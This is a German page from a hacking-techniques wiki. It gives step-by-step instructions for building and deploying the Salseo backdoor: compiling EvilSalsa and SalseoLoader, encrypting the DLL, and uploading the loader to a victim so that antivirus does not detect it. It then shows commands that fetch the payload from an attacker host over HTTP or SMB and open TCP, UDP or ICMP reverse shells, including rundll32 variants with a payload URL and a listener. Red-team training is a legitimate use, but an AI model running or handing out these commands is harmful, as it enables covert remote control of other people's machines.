# Salseo

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Kompilieren der Binaries

Laden Sie den Quellcode von GitHub herunter und kompilieren Sie **EvilSalsa** und **SalseoLoader**. Sie benötigen **Visual Studio**, um den Code zu kompilieren.

Kompilieren Sie diese Projekte für die Architektur des Windows-Systems, auf dem Sie sie verwenden möchten (Wenn Windows x64 unterstützt, kompilieren Sie sie für diese Architektur).

Sie können **die Architektur auswählen** innerhalb von Visual Studio im **linken "Build"-Tab** unter **"Platform Target".**

(\*\*Wenn Sie diese Optionen nicht finden können, klicken Sie auf **"Project Tab"** und dann auf **"\<Projektname> Eigenschaften"**)

![](<../.gitbook/assets/image (132).png>)

Bauen Sie dann beide Projekte (Build -> Build Solution) (Im Protokoll wird der Pfad der ausführbaren Datei angezeigt):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Bereiten Sie die Hintertür vor

Zuerst müssen Sie die **EvilSalsa.dll** kodieren. Dazu können Sie das Python-Skript **encrypterassembly.py** verwenden oder das Projekt **EncrypterAssembly** kompilieren:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, jetzt hast du alles, was du brauchst, um das gesamte Salseo-Ding auszuführen: die **kodierte EvilDalsa.dll** und die **Binärdatei von SalseoLoader.**

**Lade die SalseoLoader.exe-Binärdatei auf die Maschine hoch. Sie sollten von keinem AV erkannt werden...**

## **Führe die Hintertür aus**

### **Erhalte eine TCP-Reverse-Shell (kodierte DLL über HTTP herunterladen)**

Denke daran, eine nc als Reverse-Shell-Listener und einen HTTP-Server zu starten, um das kodierte evilsalsa bereitzustellen.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Einen UDP-Reverse-Shell erhalten (kodierte DLL über SMB herunterladen)**

Denken Sie daran, ein nc als Reverse-Shell-Listener zu starten und einen SMB-Server, um das kodierte evilsalsa (impacket-smbserver) bereitzustellen.
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Einen ICMP Reverse Shell erhalten (kodierte DLL bereits im Opfer)**

**Diesmal benötigen Sie ein spezielles Tool auf dem Client, um den Reverse Shell zu empfangen. Laden Sie herunter:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP-Antworten deaktivieren:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Führen Sie den Client aus:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Im Inneren des Opfers, lassen Sie uns das salseo-Ding ausführen:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilieren von SalseoLoader als DLL, die die Hauptfunktion exportiert

Öffnen Sie das SalseoLoader-Projekt mit Visual Studio.

### Fügen Sie vor der Hauptfunktion hinzu: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installieren Sie DllExport für dieses Projekt

#### **Tools** --> **NuGet-Paket-Manager** --> **NuGet-Pakete für die Lösung verwalten...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Suchen Sie nach dem DllExport-Paket (unter Verwendung des Browsen-Tabs) und drücken Sie Installieren (und akzeptieren Sie das Popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

In Ihrem Projektordner sind die Dateien erschienen: **DllExport.bat** und **DllExport\_Configure.bat**

### **De**installieren Sie DllExport

Drücken Sie **Deinstallieren** (ja, es ist seltsam, aber vertrauen Sie mir, es ist notwendig)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Beenden Sie Visual Studio und führen Sie DllExport\_configure aus**

Beenden Sie einfach Visual Studio

Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und führen Sie **DllExport\_Configure.bat** aus

Wählen Sie **x64** (wenn Sie es in einer x64-Box verwenden möchten, war das mein Fall), wählen Sie **System.Runtime.InteropServices** (innerhalb von **Namespace für DllExport**) und drücken Sie **Übernehmen**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Öffnen Sie das Projekt erneut mit Visual Studio**

**\[DllExport]** sollte nicht länger als Fehler markiert sein

![](<../.gitbook/assets/image (8) (1).png>)

### Erstellen Sie die Lösung

Wählen Sie **Ausgabetyp = Klassenbibliothek** (Projekt --> SalseoLoader-Eigenschaften --> Anwendung --> Ausgabetyp = Klassenbibliothek)

![](<../.gitbook/assets/image (10) (1).png>)

Wählen Sie die **x64** **Plattform** (Projekt --> SalseoLoader-Eigenschaften --> Erstellen --> Plattformziel = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Um die Lösung zu **erstellen**: Erstellen --> Lösung erstellen (Im Ausgabekonsolenfenster wird der Pfad zur neuen DLL angezeigt)

### Testen Sie die generierte DLL

Kopieren Sie die DLL und fügen Sie sie dort ein, wo Sie sie testen möchten.

Führen Sie aus:
```
rundll32.exe SalseoLoader.dll,main
```
Wenn kein Fehler auftritt, haben Sie wahrscheinlich eine funktionale DLL!!

## Holen Sie sich eine Shell mit der DLL

Vergessen Sie nicht, einen **HTTP** **Server** zu verwenden und einen **nc** **Listener** einzurichten

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
